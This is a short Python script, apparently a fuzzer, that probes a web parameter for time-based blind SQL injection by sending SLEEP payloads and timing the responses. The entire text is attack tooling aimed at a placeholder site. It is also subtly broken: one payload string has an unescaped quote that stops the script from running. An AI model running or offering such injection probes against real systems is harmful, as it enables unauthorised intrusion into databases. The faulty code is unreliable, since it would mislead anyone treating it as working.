import requests
import string
import time

def sqli_fuzz(base_url, param):
    payloads = ["1' AND SLEEP({}) -- ", "1" OR SLEEP({}) -- "]
    timing_threshold = 3
    
    for payload in payloads:
        for sleep_time in range(5, 10):
            crafted_url = f"{base_url}?{param}=" + payload.format(sleep_time)
            start_time = time.time()
            requests.get(crafted_url)
            response_time = time.time() - start_time
            if response_time > timing_threshold:
                print(f"Potential blind SQLi detected with payload: {payload.format(sleep_time)}")

base_url = "http://example.com/page"
param = "id"
sqli_fuzz(base_url, param)
